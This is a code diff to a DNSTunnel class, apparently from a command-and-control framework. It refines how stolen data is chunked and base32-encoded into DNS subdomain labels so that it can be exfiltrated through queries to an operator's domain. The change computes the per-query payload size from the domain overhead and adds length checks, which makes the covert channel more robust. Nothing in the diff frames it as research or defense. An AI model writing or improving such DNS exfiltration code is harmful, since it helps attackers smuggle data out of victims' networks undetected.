@@ -231,9 +231,28 @@ class DNSTunnel:
             payload={"type": data_type, "data": base64.b64encode(data).decode()},
         ))
 
-        # Chunk for DNS label limits
-        # Each DNS query can carry ~180 bytes of data in the subdomain
-        max_data_per_query = 180
+        # Compute max raw bytes per query from actual domain overhead.
+        # Full domain: "{subdomain}.{i}.{total}.{session_id}.{domain}"
+        # Use 4-digit upper bound for chunk index and total count.
+        suffix_overhead = (
+            1 + 4           # ".{i}"   — dot + up to 4 digits
+            + 1 + 4         # ".{total}"
+            + 1 + len(self._session_id)
+            + 1 + len(self._domain)
+        )
+        max_subdomain_len = _MAX_DOMAIN_LENGTH - suffix_overhead
+        if max_subdomain_len < 10:
+            logger.debug("DNS domain too long for exfil: overhead=%d", suffix_overhead)
+            return False
+
+        # Subdomain = base32 chars split into 60-char labels joined by dots.
+        # Length = n_b32 + (ceil(n_b32/60) - 1) dots.
+        # Solving: n_b32 + ceil(n_b32/60) - 1 <= max_subdomain_len
+        #   ⇒ n_b32 <= (max_subdomain_len + 1) * 60 / 61  (conservative)
+        max_b32_chars = int((max_subdomain_len + 1) * 60 / 61)
+        # Base32: 5 raw bytes → 8 encoded chars
+        max_data_per_query = max(1, (max_b32_chars * 5) // 8)
+
         chunks = C2Protocol.chunk_data(encoded, max_data_per_query)
 
         for i, chunk in enumerate(chunks):
@@ -242,6 +261,10 @@ class DNSTunnel:
             labels = [chunk_encoded[j:j + 60] for j in range(0, len(chunk_encoded), 60)]
             subdomain = ".".join(labels)
             domain = f"{subdomain}.{i}.{len(chunks)}.{self._session_id}.{self._domain}"
+
+            if len(domain) > _MAX_DOMAIN_LENGTH:
+                logger.debug("DNS exfil domain too long: %d bytes", len(domain))
+                return False
 
             if not self._send_dns_query(domain):
                 return False
